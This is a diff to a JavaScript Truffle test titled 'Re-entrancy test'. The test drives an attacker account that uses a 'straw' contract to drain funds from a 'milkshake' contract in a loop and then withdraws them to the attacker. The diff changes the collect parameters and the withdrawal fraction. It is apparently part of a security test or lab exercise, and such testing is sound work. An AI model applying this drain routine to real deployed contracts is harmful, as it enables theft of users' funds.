@@ -81,6 +81,7 @@ contract('Re-entrancy test', async (accounts) =>
             let maxIterations = 100;
             let triggerAmount = web3.utils.toBN(0.01 * ether);
             let leftoverAmount = web3.utils.toBN(0.001 * ether);
+            let collectIterations = web3.utils.toBN(10);
             while(web3.utils.toBN(milkshakeContractBalance)
                 .gt(web3.utils.toBN(leftoverAmount))
                 && maxIterations > currentIteration)
@@ -91,9 +92,8 @@ contract('Re-entrancy test', async (accounts) =>
                 console.log('trigger amount ' + triggerAmount / ether);
 
                 let amountToSend = web3.utils.toBN(triggerAmount);
-                let amountToCollect = amountToSend.mul(web3.utils.toBN(5));
                 await strawContract.collect(
-                    amountToCollect, 
+                    collectIterations, 
                     { 
                         from: attacker, 
                         value: amountToSend
@@ -109,7 +109,7 @@ contract('Re-entrancy test', async (accounts) =>
 
                 await strawContract.withdraw(
                     attacker, 
-                    web3.utils.toBN(strawContractBalance).mul(web3.utils.toBN(9)).div(web3.utils.toBN(10)), 
+                    web3.utils.toBN(strawContractBalance).mul(web3.utils.toBN(5)).div(web3.utils.toBN(10)), 
                     { from: attacker });
                 console.log('transferred amount from straw to attacker');
 
